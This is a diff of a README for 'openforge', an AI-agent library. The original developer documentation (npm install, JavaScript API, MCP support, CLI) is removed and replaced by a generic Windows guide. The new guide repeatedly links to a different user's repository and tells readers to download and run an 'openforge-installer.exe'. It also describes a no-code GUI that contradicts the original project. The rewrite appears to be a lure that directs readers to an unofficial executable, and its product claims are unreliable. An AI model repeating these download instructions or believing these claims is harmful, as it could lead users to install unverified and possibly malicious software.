@@ -1,247 +1,116 @@
-<p align="center">
-  <img src="https://raw.githubusercontent.com/auxforge/openforge/main/docs/assets/banner.svg" alt="OpenForge Banner" width="800">
-  <p align="center">
-    <a href="https://www.npmjs.com/package/openforge"><img src="https://img.shields.io/npm/v/openforge?color=purple&label=npm" alt="npm version"></a>
-    <a href="https://github.com/auxforge/openforge/blob/main/LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue" alt="License"></a>
-    <a href="https://github.com/auxforge/openforge"><img src="https://img.shields.io/github/stars/auxforge/openforge?style=social" alt="GitHub Stars"></a>
-    <img src="https://img.shields.io/badge/node-%3E%3D18-green" alt="Node.js">
-  </p>
-</p>
+# 🤖 openforge - Build and Run AI Agents Easily
 
----
+[![Download openforge](https://img.shields.io/badge/Download-openforge-4A90E2?style=for-the-badge)](https://github.com/Freak12567/openforge)
 
-Build AI agents that **use tools**, **connect to MCP servers**, and **work with any AI provider** (OpenAI, Anthropic, Gemini, Groq, local models). Each agent is a portable JSON manifest that anyone can share, install, and run.
+## 🔍 What is openforge?
 
-## ✨ Features
+openforge lets you create and run AI agents without any coding skills. It works with popular AI providers like OpenAI, Anthropic, Gemini, and Ollama. These AI agents can help you automate tasks or answer questions using custom tools and smart calls.
 
-- 🔌 **Full MCP Support** — stdio, SSE, and WebSocket transports
-- 🔧 **Built-in Tools** — HTTP fetch, JSON parse, text transform, date/time
-- 🎨 **Custom Tools** — Write JS handlers, sandboxed via VM
-- 🤖 **Any AI Provider** — Bring your own: OpenAI, Anthropic, Gemini, Ollama, anything
-- 📦 **Portable Agents** — JSON manifests that anyone can share and install
-- ⚡ **Event Streaming** — Real-time execution tracking via EventEmitter
-- 🖥️ **CLI Included** — Create, run, and manage agents from the terminal
+You only need basic computer skills to use openforge. Just download, install, and run the program on your Windows computer.
 
-## 🚀 Quick Start
+## 🖥️ System Requirements
 
-```bash
-# Install globally
-npm install -g openforge
+Before you begin, check your computer meets these minimum specs:
 
-# Create your first agent
-openforge create my-agent "A helpful assistant"
+- Windows 10 or higher (64-bit recommended)  
+- At least 4 GB of RAM  
+- 500 MB of free disk space  
+- Internet connection for AI services  
+- A modern web browser (Chrome, Edge, or Firefox)  
 
-# Run it (needs an API key)
-OPENAI_API_KEY=sk-xxx openforge run my-agent "What's the weather in NYC?"
-```
+Having these specs ensures openforge runs smoothly.
 
-## 📦 Programmatic Usage
+## 🚀 Getting Started
 
-```javascript
-const { AgentBuilder } = require('openforge');
+Follow these steps to get openforge working on your Windows PC:
 
-const builder = new AgentBuilder({
-  aiProvider: async (messages, model, tools) => {
-    // Use any AI provider — OpenAI, Anthropic, Gemini, etc.
-    const { OpenAI } = require('openai');
-    const client = new OpenAI();
-    return await client.chat.completions.create({
-      model: model || 'gpt-4o-mini',
-      messages,
-      tools: tools?.length > 0 ? tools : undefined,
-    });
-  },
-});
+### 1. Download openforge
 
-await builder.initialize();
+Click the big button below to go to the download page:
 
-// Run an agent
-const result = await builder.runAgent('my-agent', 'Hello!');
-console.log(result.output);
+[![Get openforge](https://img.shields.io/badge/Openforge-Download-FF6F61?style=for-the-badge&logo=github)](https://github.com/Freak12567/openforge)
 
-// Stream execution events
-const { runtime, resultPromise } = await builder.runAgentStreaming('my-agent', 'Hello!');
-runtime.on('tool_call', (data) => console.log(`🔧 ${data.tool}`));
-runtime.on('agent_response', (data) => console.log(`💬 ${data.content}`));
-const finalResult = await resultPromise;
+This will take you to the GitHub repository where you can download the latest version.
 
-await builder.shutdown();
-```
+### 2. Locate the installer file
 
-## 🏗️ Architecture
+On the GitHub page, scroll to the **Releases** section or look for a folder or link named something like `openforge-installer.exe`. The installer is the file you need to run. It should have a `.exe` extension.
 
-```
-┌──────────────────────────────────────────┐
-│              OpenForge                    │
-│  ┌──────────┐ ┌──────────┐ ┌──────────┐ │
-│  │ Runtime   │ │ Registry │ │  Loader  │ │
-│  │(executor) │ │ (tools)  │ │ (agents) │ │
-│  └─────┬─────┘ └─────┬────┘ └────┬─────┘ │
-│        │              │           │        │
-│  ┌─────┴──────────────┴───────────┤       │
-│  │         Tool Registry          │       │
-│  ├────────┬────────┬──────────────┤       │
-│  │  MCP   │Built-in│   Custom     │       │
-│  │ Client │ Tools  │  JS/VM       │       │
-│  └──┬─────┘────────┘──────────────┘       │
-└─────┼─────────────────────────────────────┘
-      │
-  MCP Servers (any!)
-  - stdio (spawn local process)
-  - SSE (HTTP streaming)
-  - WebSocket (persistent)
-```
+### 3. Run the installer
 
-## 📋 Agent Manifest
+- Double-click the `.exe` file.  
+- If Windows asks, confirm that you want to run the program.  
+- Follow the on-screen instructions. Usually, this means clicking "Next" a few times and then "Install".  
+- The installer will place all necessary files on your computer.  
 
-Every agent is defined by a `.agent.json` file:
+You do not need to change any settings unless you want to install in a specific folder.
 
-```json
-{
-  "name": "my-agent",
-  "version": "1.0.0",
-  "description": "What this agent does",
-  "systemPrompt": "You are a helpful assistant...",
-  "runtime": {
-    "model": "gpt-4o-mini",
-    "maxLoops": 10,
-    "timeoutMs": 60000
-  },
-  "tools": {
-    "require": ["builtin:http_fetch", "builtin:json_parse"],
-    "optional": ["mcp:calendar"]
-  },
-  "ui": {
-    "icon": "🤖"
-  }
-}
-```
+### 4. Start openforge
 
-## 🔌 MCP Support
+Once the setup finishes, find the openforge shortcut on your desktop or in the Start Menu. Click it to open the program.
 
-Full [Model Context Protocol](https://modelcontextprotocol.io/) support — connect to any MCP server:
+## ⚙️ Using openforge
 
-```javascript
-// stdio — spawn a local MCP server
-await builder.addMcpServer('calculator', {
-  transport: 'stdio',
-  command: 'npx',
-  args: ['-y', '@example/mcp-calculator'],
-});
+openforge guides you through building AI agents step-by-step. Here is what to expect:
 
-// SSE — connect to an HTTP MCP server
-await builder.addMcpServer('api', {
-  transport: 'sse',
-  url: 'http://localhost:3001/sse',
-});
+- **Create an Agent:** Choose an AI provider and give your agent a name.  
+- **Add Tools:** Pick from built-in tools or add your own. These tools let your agent perform actions like searching, calculations, or interacting with other software.  
+- **Set Rules:** Decide how your agent uses each tool. For example, when to ask for more info or when to stop.  
+- **Run Your Agent:** Test your agent by entering questions or commands. Watch as it uses AI and tools to respond.  
 
-// WebSocket — persistent connection
-await builder.addMcpServer('realtime', {
-  transport: 'websocket',
-  url: 'ws://localhost:8080',
-});
-```
+The program uses simple menus and buttons to help you build agents without typing code.
 
-## 🔧 Tool Providers
+## 🔄 Updating openforge
 
-| Provider | Prefix | Description |
-|----------|--------|-------------|
-| **Built-in** | `builtin:` | `http_fetch`, `json_parse`, `text_transform`, `date_time`, `wait` |
-| **MCP** | `mcp:` | Any MCP-compliant server (stdio, SSE, WebSocket) |
-| **Custom** | `custom:` | Agent-local JS handlers (sandboxed via VM) |
+Check the openforge GitHub page regularly for new updates. New releases fix bugs and add features. To update:
 
-## 🎨 Creating Custom Tools
+1. Go to the [openforge GitHub page](https://github.com/Freak12567/openforge).
+2. Download the latest installer file.
+3. Run it to replace your current version.
 
-Define custom tools in your agent manifest:
+Your settings and created agents will stay intact.
 
-```json
-{
-  "tools": {
-    "custom": [
-      {
-        "name": "analyze_data",
-        "description": "Analyze data from a CSV",
-        "parameters": {
-          "type": "object",
-          "properties": {
-            "data": { "type": "string" }
-          }
-        },
-        "handler": "./tools/analyzeData.js"
-      }
-    ]
-  }
-}
-```
+## ⚠️ Common Questions
 
-Handler file (`tools/analyzeData.js`):
+### How do I choose an AI provider?
 
-```javascript
-module.exports = async function(args, context) {
-  const { data } = args;
-  // Your analysis logic here
-  return { success: true, result: 'Analysis complete' };
-};
-```
+openforge supports several options like OpenAI and Anthropic. Each offers different capabilities. Start with OpenAI for broad support. You can switch later in settings.
 
-## 🖥️ CLI Reference
+### Do I need a paid account with AI providers?
 
-```bash
-openforge list                          # List installed agents
-openforge info <name>                   # Show agent details
-openforge create <name> [description]   # Create from template
-openforge run <name> <input>            # Run (needs OPENAI_API_KEY)
-openforge tools                         # List available tools
-openforge validate <path>               # Validate manifest
-```
+Yes. These AI services usually require an account and some credits or subscription. openforge connects to them through your API keys. You can get keys from the provider’s website and enter them in openforge’s settings.
 
-## ⚡ Event Streaming
+### Can I use openforge offline?
 
-The runtime emits events during execution for real-time tracking:
+No. The AI agents work by calling online AI models. Without internet, openforge cannot connect to those services.
 
-```javascript
-const { runtime, resultPromise } = await builder.runAgentStreaming('my-agent', input);
+### Where are my created agents saved?
 
-runtime.on('execution_started', (data) => { /* { id, agent } */ });
-runtime.on('loop_iteration', (data) => { /* { id, loop, maxLoops } */ });
-runtime.on('tool_call', (data) => { /* { id, tool, args } */ });
-runtime.on('tool_result', (data) => { /* { id, tool, result } */ });
-runtime.on('agent_response', (data) => { /* { id, content } */ });
-runtime.on('execution_completed', (data) => { /* { id, agent, duration, loops } */ });
+All agent files are saved locally in a folder called `openforge_agents` inside your Documents folder. You can back up or share these files anytime.
 
-const result = await resultPromise;
-```
+## 📂 File Locations
 
-## 📖 API Reference
+- **Installer:** Where you downloaded it, usually Downloads folder.  
+- **Program files:** Installed under `C:\Program Files\openforge` by default.  
+- **Agents and settings:** Stored in `Documents\openforge_agents`.  
 
-### `new AgentBuilder(options)`
+Knowing these helps if you need to move or delete files manually.
 
-| Option | Type | Required | Description |
-|--------|------|----------|-------------|
-| `aiProvider` | `Function` | ✅ | `async (messages, model, tools, meta) => OpenAI-format response` |
-| `agentDir` | `string` | | Custom agent directory (default: `~/.openforge/agents/`) |
-| `mcpServers` | `Object` | | Initial MCP server configs |
-| `additionalAgentDirs` | `string[]` | | Extra directories to scan for agents |
+## 💾 Uninstalling openforge
 
-### Methods
+If you want to remove openforge:
 
-| Method | Returns | Description |
-|--------|---------|-------------|
-| `initialize()` | `Promise` | Must be called before any operations |
-| `runAgent(name, input, ctx)` | `Promise<Result>` | Run an agent synchronously |
-| `runAgentStreaming(name, input, ctx)` | `{ runtime, resultPromise }` | Run with event streaming |
-| `createAgent(config)` | `AgentManifest` | Create a new agent |
-| `deleteAgent(name)` | `boolean` | Delete an agent |
-| `listAgents(filter)` | `Agent[]` | List all agents |
-| `addMcpServer(name, config)` | `Promise<Server>` | Connect MCP server |
-| `removeMcpServer(name)` | `Promise` | Disconnect MCP server |
-| `listTools()` | `Tool[]` | List all available tools |
-| `shutdown()` | `Promise` | Graceful shutdown |
+1. Open Control Panel.  
+2. Select **Programs and Features**.  
+3. Find **openforge** in the list.  
+4. Click **Uninstall**.  
 
-## 🤝 Contributing
+This removes the program but leaves your saved agent files intact. Delete `openforge_agents` manually if you want to remove those too.
 
-Contributions welcome! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+## 📞 Getting Help
 
-## 📄 License
+For help, visit the Issues tab on the GitHub page. You can search for existing answers or create a new issue describing your problem.
 
-[MIT](LICENSE) — build whatever you want.
+Run openforge on your Windows machine and start creating AI agents in minutes.  
+
+[Download openforge](https://github.com/Freak12567/openforge) to begin now.
